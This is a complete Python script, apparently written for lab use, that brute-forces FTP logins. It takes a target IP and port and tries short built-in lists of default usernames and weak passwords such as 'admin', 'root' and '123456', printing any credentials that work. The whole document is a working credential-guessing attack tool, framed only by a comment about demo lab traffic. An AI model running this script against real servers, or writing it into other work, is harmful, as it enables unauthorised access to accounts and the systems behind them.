#!/usr/bin/env python3
# ftp_patator.py <TARGET_IP> [PORT]
# FTP brute-force: try username/password combos against an FTP server.
import sys
import ftplib

TARGET = sys.argv[1]
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 21

# small demo wordlists (kept short on purpose for lab traffic)
USERNAMES = ["admin", "root", "ftp", "user", "test"]
PASSWORDS = ["123456", "password", "admin", "root", "ftp", "test", "1234", "qwerty"]

def try_login(user, pw):
    try:
        ftp = ftplib.FTP()
        ftp.connect(TARGET, PORT, timeout=3)
        ftp.login(user, pw)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False        # wrong credentials (server reached, login refused)
    except Exception:
        return None         # connection problem

def main():
    print(f"[FTP-Patator] target={TARGET}:{PORT} combos={len(USERNAMES)*len(PASSWORDS)}")
    attempts = 0
    for user in USERNAMES:
        for pw in PASSWORDS:
            attempts += 1
            result = try_login(user, pw)
            if result is True:
                print(f"[FTP-Patator] SUCCESS {user}:{pw}")
            elif result is None and attempts == 1:
                print("[FTP-Patator] warning: connection issue (is FTP up?)")
    print(f"[FTP-Patator] done, {attempts} attempts")

if __name__ == "__main__":
    main()
